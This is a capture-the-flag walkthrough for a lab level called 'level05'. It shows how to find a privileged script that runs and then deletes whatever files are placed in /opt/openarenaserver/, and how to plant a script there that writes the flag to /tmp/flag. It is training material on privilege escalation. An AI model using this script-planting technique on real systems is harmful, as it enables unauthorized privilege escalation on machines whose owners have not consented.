
# Resources for level05

## Walkthrough to capture the flag:

### Step 1: Find files owned by user `flag05`
```bash
find / -user flag05 2>/dev/null
```
> This searches the entire filesystem for files owned by `flag05`, ignoring permission errors.

> Output:
```
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
```

---

### Step 2: Read the `openarenaserver` script
```bash
cat /usr/sbin/openarenaserver
```
> Reveals that it runs every script inside `/opt/openarenaserver/` with a 5-second time limit, then deletes them.

---

### Step 3: Create a malicious script to capture the flag
```bash
echo "getflag > /tmp/flag" > /opt/openarenaserver/script.sh
```
> We create a script that runs `getflag` and saves the output into `/tmp/flag`.

---

### Step 4: Make the script executable
```bash
chmod +x /opt/openarenaserver/script.sh
```
> Ensures the script can be executed by the `openarenaserver` process.

---

### Step 5: Confirm the script is in the right location
```bash
ls /opt/openarenaserver/script.sh
```
> Verifies the script exists and will be picked up by the vulnerable process.

---

### Step 6: Wait a few seconds, then read the flag
```bash
cat /tmp/flag
```
> The flag will be written here by the privileged process.

---

### Final Flag
Once the script runs, the flag appears in `/tmp/flag`.
